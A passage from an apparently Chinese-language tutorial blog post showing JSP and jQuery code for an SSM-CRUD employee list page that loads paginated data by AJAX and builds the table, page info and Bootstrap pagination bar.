class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-标题-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-按钮-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>新增<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示表格数据-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    //员工数据等</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示分页信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页文字信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            当前：页，总 页,总 条记录</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页条信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        //1.页面加载完成以后，直接去发送一个ajax请求，要到分页数据</span></span><br><span class="line"><span class="xml">        $(function ()&#123;</span></span><br><span class="line"><span class="xml">           $.ajax(&#123;</span></span><br><span class="line"><span class="xml">               url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">               data:"pn=1",</span></span><br><span class="line"><span class="xml">               type:"GET",</span></span><br><span class="line"><span class="xml">               success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                   // console.log(result);</span></span><br><span class="line"><span class="xml">                   //1.解析并显示员工数据</span></span><br><span class="line"><span class="xml">                   build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                   //2.解析并显示分页信息</span></span><br><span class="line"><span class="xml">               &#125;</span></span><br><span class="line"><span class="xml">           &#125;);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">            var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">            $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">                var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">                var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">                var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"男":"女");</span></span><br><span class="line"><span class="xml">                var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">                var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">                /**</span></span><br><span class="line"><span class="xml">                 * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 编辑</span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 */</span></span><br><span class="line"><span class="xml">                var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm")</span></span><br><span class="line"><span class="xml">                                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("编辑");</span></span><br><span class="line"><span class="xml">                /**</span></span><br><span class="line"><span class="xml">                 * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 删除</span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 */</span></span><br><span class="line"><span class="xml">                var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm")</span></span><br><span class="line"><span class="xml">                    .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("删除");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">                var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">                //append方法执行完成之后还是返回原来的元素</span></span><br><span class="line"><span class="xml">                $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(empIdTd)</span></span><br><span class="line"><span class="xml">                    .append(empNameTd)</span></span><br><span class="line"><span class="xml">                    .append(genderTd)</span></span><br><span class="line"><span class="xml">                    .append(emailTd)</span></span><br><span class="line"><span class="xml">                    .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                    .append(btnTd)</span></span><br><span class="line"><span class="xml">                    .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">        function build_page_nav(result) &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<h4 id="分页条及分页信息"><a href="#分页条及分页信息" class="headerlink" title="分页条及分页信息"></a>分页条及分页信息</h4><figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    web路径：</span></span><br><span class="line"><span class="ruby">        不以/开始的相对路径，找资源，以当前资源的路径为基准，经常容易出现问题</span></span><br><span class="line"><span class="ruby">        以/开始的相对路径，找资源，以服务器的路径为标准（<span class="symbol">http:</span>/<span class="regexp">/localhost:3306）需要加上项目名</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>员工列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-标题-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-按钮-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>新增<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示表格数据-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                    员工数据等-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示分页信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页文字信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_info_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            显示页码等信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页条信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_nav_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            显示分页条信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        //1.页面加载完成以后，直接去发送一个ajax请求，要到分页数据</span></span><br><span class="line"><span class="xml">        $(function ()&#123;</span></span><br><span class="line"><span class="xml">           $.ajax(&#123;</span></span><br><span class="line"><span class="xml">               url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">               data:"pn=1",</span></span><br><span class="line"><span class="xml">               type:"GET",</span></span><br><span class="line"><span class="xml">               success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                   // console.log(result);</span></span><br><span class="line"><span class="xml">                   //1.解析并显示员工数据</span></span><br><span class="line"><span class="xml">                   build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                   //2.解析并显示分页信息</span></span><br><span class="line"><span class="xml">                   build_page_info(result);</span></span><br><span class="line"><span class="xml">                   //3.解析并显示分页条数据</span></span><br><span class="line"><span class="xml">                   build_page_nav(result);</span></span><br><span class="line"><span class="xml">               &#125;</span></span><br><span class="line"><span class="xml">           &#125;);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">            var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">            $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">                var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">                var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">                var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"男":"女");</span></span><br><span class="line"><span class="xml">                var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">                var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">                /**</span></span><br><span class="line"><span class="xml">                 * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 编辑</span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 */</span></span><br><span class="line"><span class="xml">                var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm")</span></span><br><span class="line"><span class="xml">                                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("编辑");</span></span><br><span class="line"><span class="xml">                /**</span></span><br><span class="line"><span class="xml">                 * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 删除</span></span><br><span class="line"><span class="xml">                 <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                 */</span></span><br><span class="line"><span class="xml">                var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm")</span></span><br><span class="line"><span class="xml">                    .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("删除");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">                var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">                //append方法执行完成之后还是返回原来的元素</span></span><br><span class="line"><span class="xml">                $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(empIdTd)</span></span><br><span class="line"><span class="xml">                    .append(empNameTd)</span></span><br><span class="line"><span class="xml">                    .append(genderTd)</span></span><br><span class="line"><span class="xml">                    .append(emailTd)</span></span><br><span class="line"><span class="xml">                    .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                    .append(btnTd)</span></span><br><span class="line"><span class="xml">                    .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">        //解析显示分页信息</span></span><br><span class="line"><span class="xml">        function build_page_info(result)&#123;</span></span><br><span class="line"><span class="xml">            $("#page_info_area").append("当前"+result.extend.pageInfo.pageNum+"页,总"</span></span><br><span class="line"><span class="xml">                +result.extend.pageInfo.pages+"页,总"</span></span><br><span class="line"><span class="xml">                +result.extend.pageInfo.total+"条记录");</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">        //解析显示分页条,点击分页要能去下一页等等....</span></span><br><span class="line"><span class="xml">        function build_page_nav(result) &#123;</span></span><br><span class="line"><span class="xml">            //page_nav_area</span></span><br><span class="line"><span class="xml">            var ul = $("<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>").addClass("pagination");</span></span><br><span class="line"><span class="xml">            var firstPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("首页").attr("href","#"));</span></span><br><span class="line"><span class="xml">            var prePageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;laquo;"));</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            var nextPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;raquo;"));</span></span><br><span class="line"><span class="xml">            var lastPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("末页").attr("href","#"));</span></span><br><span class="line"><span class="xml">            //添加首页和前一页的提示</span></span><br><span class="line"><span class="xml">            ul.append(firstPageLi).append(prePageLi);</span></span><br><span class="line"><span class="xml">            //1,2,3....遍历给ul中添加页码提示</span></span><br><span class="line"><span class="xml">            $.each(result.extend.pageInfo.navigatepageNums,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">                var numLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span 